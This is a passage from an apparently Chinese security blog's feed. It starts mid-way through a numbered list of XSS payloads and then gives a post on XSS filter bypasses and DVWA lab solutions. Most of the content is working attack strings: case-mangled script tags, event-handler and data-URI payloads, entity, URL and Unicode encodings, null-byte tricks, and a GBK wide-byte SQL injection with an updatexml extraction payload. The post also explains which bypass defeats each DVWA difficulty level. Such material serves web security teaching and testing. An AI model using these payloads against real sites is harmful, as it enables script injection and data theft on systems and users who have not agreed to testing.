size=\&quot;&amp;{alert(&#39;xss&#39;)}\&quot;&gt;</code></p><p>43.<code>&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;</code></p><p>44.<code>&quot;&gt;&lt;BODY onload!#$%&amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&gt;</code></p><p>45.<code>[color=red width=expression(alert(123))][color]</code></p><p>46.<code>&lt;BASE HREF=&quot;javascript:alert(&#39;XSS&#39;);//&quot;&gt;</code></p><p>47.<code>Execute(MsgBox(chr(88)&amp;&amp;chr(83)&amp;&amp;chr(83)))&lt;</code></p><p>48.<code>&quot;&gt;&lt;/iframe&gt;&lt;script&gt;alert(123)&lt;/script&gt;</code></p><p>49.<code>&lt;body onLoad=&quot;while(true) alert(&#39;XSS&#39;);&quot;&gt;</code></p><p>50.<code>&quot;&lt;marquee&gt;&lt;img src=k.png onerror=alert(/xss/) /&gt;</code></p><p>51.<code>&lt;div style=&quot;background:url(&#39;javascript:&#39;)</code></p><p>52.<code>&lt;img src=&#39;java\nscript:alert(\&quot;XSS\&quot;)&#39;&gt;</code></p><p>53.<code>&gt;&#39;&quot;&gt;&lt;img src=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;</code></p><p>54.<code>&lt;svg&gt;&lt;script&gt;alert&amp;#40/1/&amp;#41&lt;/script&gt;</code></p><p>55.<code>&lt;q/oncut=open()&gt;</code></p><p>56.<code>&lt;q/oncut=alert(1)&gt;</code>//在限制长度的地方很有效</p><p>57.<code>&lt;applet code=&quot;javascript:confirm(document.cookie);&quot;&gt; // Firefox有效</code></p><p>58.<code>&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=&quot;&gt;</code></p><p>59.<code>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</code></p><p>60.<code>&lt;formaction=&#39;data:text&amp;sol;html,&amp;lt;script&amp;gt;alert(1)&amp;lt/script&amp;gt&#39;&gt;&lt;button&gt;CLICK</code></p><p>61.<code>&lt;iframe/src=&quot;data:text&amp;sol;html;&amp;Tab;base64&amp;NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==&quot;&gt;</code></p><p>62.<code>&lt;body/onhashchange=alert(1)&gt;&lt;a href=#&gt;clickit</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;1.&lt;code&gt;&amp;lt;script&amp;gt; alert(1);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;xss&amp;#39;);&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;3.
      
    
    </summary>
    
      <category term="XSS" scheme="http://yoursite.com/categories/XSS/"/>
    
    
  </entry>
  
  <entry>
    <title>XSS绕过及DVWA实例</title>
    <link href="http://yoursite.com/2018/12/01/XSS%E7%BB%95%E8%BF%87%E5%8F%8ADVWA%E5%AE%9E%E4%BE%8B/"/>
    <id>http://yoursite.com/2018/12/01/XSS绕过及DVWA实例/</id>
    <published>2018-12-01T13:52:18.000Z</published>
    <updated>2018-12-02T07:12:54.413Z</updated>
    
    <content type="html"><![CDATA[<a id="more"></a><h2 id="最基本的用法："><a href="#最基本的用法：" class="headerlink" title="最基本的用法："></a>最基本的用法：</h2><p><code>&lt;script&gt;alert(&#39;xss&#39;);&lt;/script&gt;</code></p><h2 id="黑名单绕过："><a href="#黑名单绕过：" class="headerlink" title="黑名单绕过："></a>黑名单绕过：</h2><p>大多数的场所是用的黑名单来做过滤器的。</p><ul><li>尝试插入比较正常的HTML标签，例如：<code>&lt;b&gt;</code>，<code>&lt;i&gt;</code>，<code>&lt;u&gt;</code>来看一下返回页面的情况是怎样的，是否被HTML编码了，或者标签被过滤了。</li><li>尝试插入不闭合的标签，例如：<code>&lt;b</code>，<code>&lt;i</code>，<code>&lt;u</code>，<code>&lt;marquee</code>然后看一下返回响应，是否对开放的标签也有过滤。</li></ul><h2 id="大小写及重写的绕过"><a href="#大小写及重写的绕过" class="headerlink" title="大小写及重写的绕过:"></a>大小写及重写的绕过:</h2><p><code>&lt;SCRIscriptPT&gt;AalLEerRtT(&#39;xss&#39;);&lt;/SCscriptRIPT&gt;</code></p><h2 id="事件绕过："><a href="#事件绕过：" class="headerlink" title="事件绕过："></a>事件绕过：</h2><p><code>利用JS事件进行相关绕过：&lt;img src=# onerror=alert(&#39;xss&#39;);&gt;</code></p><h3 id="相关JS事件："><a href="#相关JS事件：" class="headerlink" title="相关JS事件："></a>相关JS事件：</h3><p><img src="https://i.imgur.com/8cjjBPV.png" alt=""></p><h2 id="编码绕过："><a href="#编码绕过：" class="headerlink" title="编码绕过："></a>编码绕过：</h2><blockquote><p>当浏览器接受到一份HTML代码后，会对标签之间（<code>&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;</code>除外)、标签的属性中（<code>&lt;a href=&#39;xxxx&#39;&gt;</code>）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在<code>href=&#39;xx&#39;</code>这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段</p></blockquote><p>例如：<br><code>&lt;img src=1 onerror=&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;</code></p><blockquote><p>上述代码解析后为：<code>&lt;img src=1 onerror=alert(1)&gt;</code> ,可以弹窗</p></blockquote><p>在代码被HTML解释器解释后，如果遇到需要填入url的位置，则该位置交由url解释器解释，如果是js代码的(例如onclick=””)，就js解释器解释，但是注意：javascript:不能用url编码代替，因为javascript:为协议类型，若是使用url编码，会被当作普通字符串，后面的js代码也不会被当作js代码解释</p><p><code>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></p><blockquote><p>被url解释器解释完后为<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;</code>，url中出现了<code>javascript:</code>，指明了后面的语句要当作js执行，所以再次把解释后的字符交给js解释器解释，可以弹窗。</p></blockquote><p>当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。<br><code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#39;xss&#39;)&lt;/script&gt;</code></p><p>解码后为<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>,一样可以弹窗。但如果是：<br><code>&lt;script&gt;document.write(&#39;\u0039\u0041\u0059\u0097\u0108;\u0101\u0114\u0016\u0040\u0039\u0049\u0049\u0049&#39;)&lt;/script&gt;</code></p><blockquote><p>解码后为 <code>&lt;script&gt;document.write(&#39; &#39;);alert(&#39;111&#39;)&lt;/script&gt;</code>就不要指望他可以弹窗了。因为解码出来的<code>&#39;);alert(&#39;111</code>仍为被当作字符串而不会影响上下文。</p></blockquote><h2 id="利用String-fromCharCode进行编码绕过"><a href="#利用String-fromCharCode进行编码绕过" class="headerlink" title="利用String.fromCharCode进行编码绕过"></a>利用String.fromCharCode进行编码绕过</h2><p>测试代码：</p><pre><code>&lt;?phpfunction xss_check($str){    if(preg_match(&apos;/script|alert/i&apos;, $str))        return &apos;error&apos;;    else        return $str;}@$id = $_GET[&apos;id&apos;];echo xss_check($id);?&gt;</code></pre><p>屏蔽了alert(也可能是其他的)，此时可以使用编码绕过：</p><p><code>&lt;img src=1 onerror=\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0061\u006c\u0065\u0072\u0074(/xss/);&gt;</code></p><blockquote><p>将<code>javascript</code>和<code>alert</code>进行unicode编码实现绕过，成功弹窗。</p></blockquote><h4 id="利用String-fromCharCode进行编码绕过-1"><a href="#利用String-fromCharCode进行编码绕过-1" class="headerlink" title="利用String.fromCharCode进行编码绕过:"></a>利用String.fromCharCode进行编码绕过:</h4><p><code>&lt;img src=2 onerror=eval(String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41))&gt;</code></p><blockquote><p>其中<code>String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41)</code>是<code>alert(/xss/)</code>编码后的内容，google插件hackbar就有此功能。</p></blockquote><p><img src="https://i.imgur.com/vyiYgVR.png" alt=""></p><h2 id="GBK宽字节绕过"><a href="#GBK宽字节绕过" class="headerlink" title="GBK宽字节绕过"></a>GBK宽字节绕过</h2><p>测试代码：</p><pre><code>&lt;!DOCTYPE html&gt; &lt;meta charset=&quot;gbk&quot;&gt;&lt;?php error_reporting(0);$conn = mysql_connect(&apos;127.0.0.1&apos;,&apos;root&apos;,&apos;root&apos;); mysql_select_db(&apos;test&apos;,$conn);#mysql_query(&quot;set names gbk&quot;); $id = addslashes($_GET[&apos;sql&apos;]); $sql = &quot;SELECT username,password FROM admin WHERE id=&apos;{$id}&apos;&quot;; echo $sql.&apos;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&apos;;if($res = mysql_query($sql)){ while($row = mysql_fetch_array($res)){ var_dump($row);}}else{ echo &quot;Error&quot;.mysql_error().&quot;&lt;/br&gt;&quot;;  } ?&gt;</code></pre><p><img src="https://i.imgur.com/0v8MiC1.png" alt=""></p><blockquote><p>直接<strong>‘</strong>会被转义，不会被执行。</p></blockquote><p><img src="https://i.imgur.com/0dSavf0.png" alt=""></p><blockquote><p>使用宽字符就可以被成功执行</p></blockquote><h3 id="解析过程"><a href="#解析过程" class="headerlink" title="解析过程"></a>解析过程</h3><ul><li><code>$_GET[‘id’]</code>经过<strong>addslashes</strong>编码之后带入了‘’</li><li>变成 <code>&lt;pre&gt;2%df%5C%27 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)%23&lt;/pre&gt;</code></li><li>带入mysql处理时使用了gbk字符集</li><li><strong>%df%5c</strong> 運成功的吃掉了<strong>%5c</strong></li><li><strong>%27‘</strong>单引号成功闭合</li><li>GBK编码，编码范围是<strong>0x8140~0xFEFE</strong>（不包括xx7F），在遇到<strong>%df(ascii(223)) &gt;ascii(128)</strong>时自动拼接<strong>%5c，</strong>因此吃掉<strong>‘</strong>，而<strong>%27</strong>、<strong>%20</strong>小于<strong>ascii(128)</strong>的字符就保留了。</li></ul><h2 id="0字节绕过"><a href="#0字节绕过" class="headerlink" title="0字节绕过"></a>0字节绕过</h2><pre><code>&lt;scri%00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;scri\x00pt&gt;alert(1);&lt;/scri%00pt&gt;&lt;s%00c%00r%00%00ip%00t&gt;confirm(0);&lt;/s%00c%00r%00%00ip%00t&gt;</code></pre><p>在IE9及以下版本成功绕过。</p><h2 id="IE6下绕过"><a href="#IE6下绕过" class="headerlink" title="IE6下绕过"></a>IE6下绕过</h2><p>IE下还可利用javascript:alert(/xss/); 或css</p><pre><code>body {background:black;xss:expression(alert(/zhuling.wang/));/*IE6下测试*/}</code></pre><blockquote><p>成功绕过</p></blockquote><h2 id="DVWA测试用例"><a href="#DVWA测试用例" class="headerlink" title="DVWA测试用例"></a>DVWA测试用例</h2><h3 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h3><h4 id="低等级"><a href="#低等级" class="headerlink" title="低等级"></a>低等级</h4><p>任意XSS都可用</p><h4 id="中等级"><a href="#中等级" class="headerlink" title="中等级"></a>中等级</h4><pre><code>&lt;script  &gt;alert(&apos;123&apos;)&lt;/script&gt;&lt;sCript&gt;alert(&apos;123&apos;)&lt;/script&gt;&lt;scri&lt;script&gt;pt&gt;alert(&apos;123&apos;)&lt;/script&gt;&lt;img src=# onerror=alert(1)&gt;&lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt;等等</code></pre><h4 id="高等级"><a href="#高等级" class="headerlink" title="高等级"></a>高等级</h4><p>过滤掉script标签更严格，不能使用script标签</p><pre><code>&lt;h1 onclick=alert(1)&gt;123&lt;/h1&gt;&lt;img src=# onerror=alert(1)&gt;</code></pre><p>其他html标签构造的事件还是可以使用的。</p><h4 id="不可能级别"><a href="#不可能级别" class="headerlink" title="不可能级别"></a>不可能级别</h4><p>用到了<code>htmlspecialchars()</code>，这个函数是将预定义的字符转换为 HTML 实体。<br>预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li><blockquote><p>（大于）成为 &gt;</p></blockquote></li></ul><h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><h4 id="低等级-1"><a href="#低等级-1" class="headerlink" title="低等级"></a>低等级</h4><p>没有过滤直接注入，但是name框有最大长度限制，所以选择在message注入。</p><p><code>&lt;img src=# onerror=alert(1)&gt;等等</code></p><h4 id="中等级-1"><a href="#中等级-1" class="headerlink" title="中等级"></a>中等级</h4><p>因为一上来就给Message添加了<code>htmlspecialchars</code>函数所以不能进行注入，但是name框长度的最大限制是在html设置的，所以可以在审查元素中直接对长度进行修改。<br>或者可以用<strong>burp</strong>抓包发送。</p><h4 id="高等级-1"><a href="#高等级-1" class="headerlink" title="高等级"></a>高等级</h4><p>message还是封死了，还是把script过滤掉了，跟中等级类似，抓包发送等等。</p><p><img src="https://i.imgur.com/85bxZJs.png" alt=""></p><h4 id="不可能级别-1"><a href="#不可能级别-1" class="headerlink" title="不可能级别"></a>不可能级别</h4><p>这里对name和message都做了htmlspecialchars（）处理。</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><h4 id="低等级-2"><a href="#低等级-2" class="headerlink" title="低等级"></a>低等级</h4><p>直接在网页导航栏构造GET XSS即可完成注入</p><h4 id="中等级-2"><a href="#中等级-2" class="headerlink" title="中等级"></a>中等级</h4><p>源码显示会过滤掉script标签，但是直接用<code>&lt;img src=# onerror=alert(1)&gt;</code>没有直接执行，尝试闭合<strong>option</strong>没有成功,尝试闭合select标签成功执行。<br><img src="https://i.imgur.com/x7PaOkG.png" alt=""></p><blockquote><p><code>?#default=&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code>也可以。</p></blockquote><h4 id="高等级-2"><a href="#高等级-2" class="headerlink" title="高等级"></a>高等级</h4><p>对传入值进行switch判断</p><p><code>?default=English #&lt;script&gt;alert(1)&lt;/script&gt;</code></p><blockquote><p><strong>#</strong>该字符后的数据不会发送到服务器端，从而绕过服务端过滤。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;最基本的用法：&quot;&gt;&lt;a href=&quot;#最基本的用法：&quot; class=&quot;headerlink&quot; title=&quot;最基本的用法：&quot;&gt;&lt;/a&gt;最基本的用法：&lt;/h2&gt;&lt;p&gt;&lt;code&gt;&amp;lt;script&amp;gt;alert(&amp;#39;x
      
    
    </summary>
    
      <category term="XSS" scheme="http://yoursite.com/categories/XSS/"/>
    
    
  </entry>
  
</feed>
